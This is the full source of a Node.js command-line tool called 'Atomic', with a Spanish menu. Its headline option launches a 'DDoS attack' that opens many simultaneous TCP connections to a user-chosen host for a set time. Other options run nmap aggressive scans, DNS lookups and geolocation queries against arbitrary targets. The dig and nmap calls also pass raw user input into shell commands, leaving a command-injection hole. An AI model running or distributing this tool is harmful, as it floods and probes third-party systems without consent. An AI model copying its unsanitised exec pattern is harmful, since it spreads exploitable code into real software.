const net = require('net');
const rl = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});

const async = require('async');
const axios = require('axios');
const lolcatjs = require('lolcatjs');

lolcatjs.options.seed = Math.round(Math.random() * 1000);
lolcatjs.options.colors = true;

const { exec } = require('child_process');
var figlet = require("figlet");


const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`    
 ╭────────────────────────────────╮
 │ ⚠️ Conectado a ${url}   │
 ╰────────────────────────────────╯`);
});
socket.on('data', (data) => {
console.log(`Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};


const getInfo = async (ip) => {
try {
const command = `dig +nocmd ${ip} any +multiline`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);
const details = [];
for (const line of lines) {
if (line.includes(';; ANSWER SECTION:')) {
details.push('** ANSWER SECTION **');
} else if (line.includes(';')) {
const [key, value] = line.split(';');
details.push(`  ${key.trim()}: ${value.trim()}`);
} else {
const parts = line.split(/\s+/);
const recordType = parts[3];
const ttl = parts[1];
const value = parts[4];
switch (recordType) {
case 'A':
details.push(`  IP Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'AAAA':
details.push(`  IPv6 Address: ${value} (TTL: ${ttl} seconds)`);
break;
case 'NS':
details.push(`  Name Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'MX':
details.push(`  Mail Server: ${value} (TTL: ${ttl} seconds)`);
break;
case 'SOA':
details.push(`  Start of Authority: ${value} (TTL: ${ttl} seconds)`);
break;
default:
details.push(`  Unknown Record Type: ${recordType} (TTL: ${ttl} seconds)`);
}
}
}
console.log(` DNS Information for ${ip}:`);
console.log(`---------------------------`);
console.log(details.join(String.raw`
`));
console.log(`---------------------------`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const analyzeIP = async (ip) => {
try {
const command = `nmap -A -T4 ${ip}`;
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error.message}`);
return;
}
const lines = stdout.trim().split(String.raw`
`);

let openPorts = [];
let services = {};
let os = '';
let deviceType = '';
let uptime = '';
let tcpSequence = '';
let ipIdSequence = '';
let osCPE = '';
let osGeneration = '';

lines.forEach((line) => {
const parts = line.trim().split(/ +/);
if (parts.length > 3 && parts[1] === 'open') {
const port = parts[0];
const state = parts[1];
const service = parts[2];
const version = parts.slice(3).join(' ');
openPorts.push({ port, state, service, version });
services[port] = service;
} else if (parts[0] === 'OS:') {
os = parts.slice(1).join(' ');
} else if (parts[0] === 'CPE:') {
osCPE = parts.slice(1).join(' ');
} else if (parts[0] === 'Device') {
deviceType = parts.slice(2).join(' ');
} else if (parts[0] === 'Uptime:') {
uptime = parts.slice(1).join(' ');
} else if (parts[0] === 'TCP') {
tcpSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'IP') {
ipIdSequence = parts.slice(3).join(' ');
} else if (parts[0] === 'OS') {
osGeneration = parts.slice(2).join(' ');
}
});

console.log(`Nmap scan report for ${ip}`);
console.log(`Host is up.
`);

console.log(`PORT      STATE SERVICE    VERSION`);
openPorts.forEach((port) => {
console.log(`${port.port}      ${port.state} ${port.service}    ${port.version}`);
});

console.log(`
Service Info:`);
console.log(`OS: ${os} (${osCPE})`);
console.log(`Device type: ${deviceType}`);
console.log(`Uptime: ${uptime}`);
console.log(`TCP Sequence Prediction: ${tcpSequence}`);
console.log(`IP ID Sequence Generation: ${ipIdSequence}`);
console.log(`OS Generation: ${osGeneration}`);

console.log(`
`);
});
} catch (error) {
console.error(`Error: ${error.message}`);
}
};






const getGeoIP = async (ip) => {
try {
const response = await axios.get(`http://ip-api.com/json/${ip}`);
const data = response.data;

console.log(' ');
console.log(' ');

lolcatjs.fromString(
  figlet.textSync("Info", {
    font: "Standard",
    horizontalLayout: "default",
    verticalLayout: "default",
    width: 80,
    whitespaceBreak: true,
  })
);

console.log(' ');
lolcatjs.fromString(`〔1〕IP: ${data.query}`);
lolcatjs.fromString(`〔2〕Estatus: ${data.status}`);
lolcatjs.fromString(`〔3〕Continente: ${data.continent}`);
lolcatjs.fromString(`〔4〕Código del continente: ${data.continentCode}`);
lolcatjs.fromString(`〔5〕País: ${data.country}`);
lolcatjs.fromString(`〔6〕Código del país: ${data.countryCode}`);
lolcatjs.fromString(`〔7〕Región: ${data.region}`);
lolcatjs.fromString(`〔8〕Estado: ${data.regionName}`);
lolcatjs.fromString(`〔9〕Ciudad: ${data.city}`);
lolcatjs.fromString(`〔10〕Distrito: ${data.district}`);
lolcatjs.fromString(`〔11〕Código postal: ${data.zip}`);
lolcatjs.fromString(`〔12〕Latitud: ${data.lat}`);
lolcatjs.fromString(`〔13〕Longitud: ${data.lon}`);
lolcatjs.fromString(`〔14〕Zona horaria: ${data.timezone}`);
lolcatjs.fromString(`〔15〕Offset: ${data.offset}`);
lolcatjs.fromString(`〔16〕Moneda: ${data.currency}`);
lolcatjs.fromString(`〔17〕ISP: ${data.isp}`);
lolcatjs.fromString(`〔18〕Empresa: ${data.org}`);
lolcatjs.fromString(`〔19〕AS: ${data.as}`);
lolcatjs.fromString(`〔20〕Nombre de AS: ${data.asname}`);
lolcatjs.fromString(`〔21〕Es un celular: ${data.mobile}`);
lolcatjs.fromString(`〔22〕Es un proxy: ${data.proxy}`);
lolcatjs.fromString(`〔23〕Es un hosting: ${data.hosting}`);
} catch (error) {
console.error(`Error: ${error.message}`);
}
};


const showMenu = () => {
  console.clear();

lolcatjs.fromString(
  figlet.textSync("Atomic", {
    font: "Standard",
    horizontalLayout: "default",
    verticalLayout: "default",
    width: 80,
    whitespaceBreak: true,
  })
);

  lolcatjs.fromString(' 「Desarrollado por Keiji821」');
  lolcatjs.fromString('                ');
  lolcatjs.fromString('〔1〕Iniciar ataque DDoS');
  lolcatjs.fromString('〔2〕Actualizar código');
  lolcatjs.fromString('〔3〕Configurar conexiones simultáneas');
  lolcatjs.fromString('〔4〕Configurar duración del DDoS');
  lolcatjs.fromString('〔5〕Información de DNS para una dirección IP');
  lolcatjs.fromString('〔6〕Análisis de IP');
  lolcatjs.fromString('〔7〕Información geográfica de IP');
  lolcatjs.fromString('               ');
  lolcatjs.fromString('〔0〕Salir');
  lolcatjs.fromString('               ');
  rl.setPrompt('｢🎐｣➤ ');
  rl.prompt();
};


let numConnections = 100; // Número de conexiones simultaneas por defecto
let attackDuration = 60; // Duración del ataque por defecto


rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo');
rl.question('URL/IP: ', (url) => {
if (url === '') {
console.log('Url o ip invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu();
}
});
break;
case '2':
updateCode();
showMenu();
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu();
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos)');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu();
}
});
break;
case '5':
console.log('Ingrese la IP para obtener información');
rl.question('IP: ', (ip) => {
if (ip === '') {
console.log('IP invalida');
showMenu();
} else {
getInfo(ip);
showMenu();
}
});
break;
case '6':
console.log('Ingrese la ip o dominio para el análisis ');
rl.question('IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('Ip o dominio invalido');
showMenu();
} else {
try {
analyzeIP(ip);
} catch (error) {
console.error(`Error al analizar IP: ${error.message}`);
}
showMenu();
}
});
break;
case '7':
console.log('Ingrese la ip o dominio para obtener información geográfica');
rl.question('IP/Dominio: ', (ip) => {
if (ip === '') {
console.log('Ip o dominio invalido');
showMenu();
} else {
getGeoIP(ip);
showMenu();
}
});
break;
case '0':
console.log('Saliendo...');
process.exit();
break;
default:
console.log('Opción invalida');
showMenu();
}
}).on('close', () => {
process.exit();
});